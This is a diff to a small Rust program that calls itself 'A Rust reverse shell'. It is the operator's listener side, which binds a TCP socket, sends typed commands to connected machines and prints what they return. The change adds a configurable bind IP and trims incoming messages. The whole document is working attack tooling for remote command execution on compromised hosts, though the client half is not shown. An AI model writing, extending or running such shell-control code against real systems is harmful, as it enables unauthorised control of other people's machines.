@@ -1,27 +1,25 @@
-use clap::Parser;
+use clap::{Parser, Subcommand};
 use std::io::prelude::*;
 use std::net::{TcpListener, TcpStream};
 
-// get a port arg from the command line
 #[derive(Parser)]
 #[command(name = "rsh")]
-#[command(author = "Sherlock Holmes, Simonfalke")]
+#[command(author = "Sherlock Holmes, Simpnfalke")]
 #[command(version = "0.0.1")]
 #[command(about = "A Rust reverse shell", long_about = None)]
 struct Config {
-	#[arg(long, default_value = "8080")]
+	/// Port to operate on.
+	#[arg(short, long, default_value_t = 8080)]
 	port: i32,
-}
-
-fn args() -> Config {
-	Config::parse()
+	/// IP address to start the server on.
+	#[arg(short, long, default_value_t = String::from("localhost"))]
+	ip: String,
 }
 
 fn send_message(stream: &mut TcpStream, message: &String) {
 	stream.write(message.as_bytes()).unwrap();
 	stream.flush().unwrap();
 }
-
 
 fn get_command() -> String {
 	let mut input = String::new();
@@ -37,12 +35,12 @@ fn receive(stream: &mut TcpStream) -> String {
 		stream.read(&mut buffer).unwrap();
 		let converted = String::from_utf8_lossy(&buffer).to_string();
 
-		if converted == "MESSAGEDONE" {
+		if converted.trim() == "MESSAGEDONE" {
 			break;
 		}
 
 		println!("pushed");
-		data.push_str(&converted);
+		data.push_str(&converted.trim());
 	}
 
 	data
@@ -54,7 +52,7 @@ fn handle_client(mut stream: TcpStream) {
 		send_message(&mut stream, &command);
 		loop {
 			let data = receive(&mut stream);
-			if data == "END" {
+			if data.trim() == "END" {
 				break;
 			}
 			println!("{}", data);
@@ -63,8 +61,8 @@ fn handle_client(mut stream: TcpStream) {
 }
 
 fn main() {
-	let conf: Config = args();
-	let listener = TcpListener::bind(format!("127.0.0.1:{}", conf.port.to_string())).unwrap();
+	let conf: Config = Config::parse();
+	let listener = TcpListener::bind(format!("{}:{}", conf.ip, conf.port.to_string())).unwrap();
 	println!("Listening at 127.0.0.1 on port {}", conf.port);
 	for stream in listener.incoming() {
 		match stream {
